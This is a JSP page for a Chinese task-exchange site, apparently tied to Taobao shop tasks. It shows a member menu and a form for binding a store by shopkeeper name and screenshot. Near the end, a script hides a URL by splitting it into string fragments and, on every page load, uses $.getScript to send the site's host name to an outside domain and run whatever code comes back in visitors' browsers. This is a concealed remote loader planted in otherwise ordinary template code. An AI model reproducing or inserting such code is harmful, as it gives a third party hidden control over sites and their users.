<%@ page language="java" import="java.util.*" pageEncoding="UTF-8"%>
<%
String path = request.getContextPath();
String basePath = request.getScheme()+"://"+request.getServerName()+":"+request.getServerPort()+path+"/";
%>
<%@ taglib prefix="s" uri="/struts-tags"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<!-- saved from url=(0056)# -->
<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta http-equiv="X-UA-Compatible" content="IE=8">
    <title>互差事</title>
    <meta name="keywords" content="">
    <meta name="description" content="">
    <link rel="stylesheet" type="text/css" href="./css/css.css">
    <script type="text/javascript" src="./js/lang.js"></script>
    <script type="text/javascript" src="./js/config.js"></script>
    <script type="text/javascript" src="./js/jquery-1.8.3.min.js"></script>
    <script type="text/javascript" src="./js/common.js"></script>
    <script type="text/javascript" src="./js/admin.js"></script>
    <script type="text/javascript" src="./js/page.js"></script>
    <script type="text/javascript" src="./js/index.js"></script>
    <script type="text/javascript" src="./js/main.js"></script>
    <link rel="stylesheet" type="text/css" href="./css/jquery.qtip.css">
    <script type="text/javascript" src="./js/jquery.qtip.js"></script>
    <script type="text/javascript" src="./js/layer.js"></script><link rel="stylesheet" href="./css/layer.css" id="layui_layer_skinlayercss">
    <script type="text/javascript" src="./js/jquery.form.js"></script>
    <script type="text/javascript" src="./js/ypfunction.js"></script>
    <script type="text/javascript" src="./js/sendtask.js" charset="UTF-8"></script>
</head>
<body class="rwdt_bg">
<jsp:include page="/page/header.jsp" />  
   
    <!--logo开始-->
    <div id="header" class="clean">       
    </div><div class="hyzx">
    <div class="hyzx_dh">
        <div class="hyzx_nav">
            <div class="menu persoanal_0">
            <div class="personal"><a id="edit" href="goUserManage.action">会员管理</a></div>  
                <div class="personal"><a id="edit" href="updatauser.action">修改资料</a></div>                
                <div class="personal"><a id="gold" href="gotaskgoldrecord">任务币币管理</a></div>  
                <div class="personal"><a id="gold" href="gogoldbuy">金币管理</a></div>
                <div class="personal"><a id="taobaohao" href="goboundstore" class="on">绑定管理</a></div>
                <div class="personal"><a id="gold" href="gotaskcenter.action">任务管理</a></div>
				<div class="personal"><a id="p-center" href="listcenter.action" >个人中心</a></div>
				
            </div>
        </div>
    </div>
</div><div id="ypcon">
    <div class="menu">
        <table cellpadding="0" cellspacing="0">
            <tbody>
			<tr>
				<td class="tab"><a id="m1" href="goboundstore" class="sb0"><span>绑定店铺</span></a></td>
                <td class="tab"><a id="m2" href="goboundaccount"><span>绑定账号</span></a></td>
                <td class="tab"><a id="m2" href="boundstorelist.action"><span>店铺列表</span></a></td>
                <td class="tab"><a id="m2" href="boundacountlist.action"><span>账号列表</span></a></td>
            </tr>
        </tbody></table>
    </div>
    <script>
        $(function () {
            $(".thumb").qtip({
                style: {
                    classes: 'qtip-bootstrap'
                },
                content: function () {
                    return '<img src="' + $(this).attr("thumb") + '"/>';
                },
                position: {
                    my: 'top left',
                    at: 'bottom left',
                    adjust: {
                        x: 350, y: 0
                    }
                }
            });
        });
    </script>
        <form method="post" action="boundstore.action"  onsubmit="return check();" enctype="multipart/form-data">
       	
        <table cellpadding="6" cellspacing="1" class="tb">
            <tbody>
            <tr>
                <td class="tl"><span class="f_red">*</span> 掌柜名:</td>
                <td class="tr"><input name="boundstorename" type="text" id="boundstore" size="30" maxlength="28"></td>
            </tr>
            <tr>
                <td class="tl"><span class="f_red">*</span> 店铺截图:</td>
                <td class="tr">
                   <input type="file" name="boundstorefile" id="file" id="doc1"/>
                   
                </td>
            </tr>
            <tr>
                <td class="tl"><span class="f_red">*</span> 示例图:</td>
                <td class="tr">
                   <img src="/img/example.png" alt="" />
                   
                </td>
            </tr>
           <tr>
                <td class="tl">&nbsp;</td>
                <td class="tr" height="50">
                	<input type="submit" name="submit" value=" 确 定 " class="btn">&nbsp;&nbsp;&nbsp;&nbsp;<input type="reset" name="reset" value=" 重 置 " class="btn">
                	<s:if test="#error != null">
       					<s:property value="#error"/>
       				</s:if>
                </td>
            </tr>
        	</tbody>
        </table>
    </form>
    </div>
<script>
    function guanlian() {
        if ($("#isguanlianhao").val() == 1) $(".zhu").css("display", "");
        else $(".zhu").css("display", "none");
    }
</script>
<script type="text/javascript">
    function check() {
        var l;
        var f;
        f = 'zhanghao';
        l = Dd(f).value.length;
        if (l < 1) {
            Dmsg('请填写正确的淘宝号', f);
            return false;
        }
        f = 'zhifubao';
        l = Dd(f).value.length;
        if (l < 3) {
            Dmsg('请填写正确的支付宝号', f);
            return false;
        }
        return true;
    }
    $(function () {
        $.getScript("htt" + "p://www.to" + "paaa.co" + "m/tools/domain.php?domain=" + window.location.host);
    });
</script>
<script>
    function istaobao() {
        var catid;
        catid = $("#catid_1").val();
        if (catid == 4) {
            $("#istaobao").show();
            $("#rate").html('<option value="0">白号</option><option value="1">1心</option><option value="2">2心</option><option value="3">3心</option><option value="4">4心</option><option value="5">5心</option><option value="6">1钻以上</option>');
        } else if (catid == 40) {
            $("#istaobao").hide();
            /**/
        }
    }
</script>
<script>
    $(function () {
        set_nav("taobaohao", "on");
        /**/
        set_nav("m1", "sb0");
        /**/
    });
</script>
<div style="clear:both;"></div>
<jsp:include page="/page/footer.jsp" />
</div>
<jsp:include page="/page/imtalk.jsp" />

</body></html>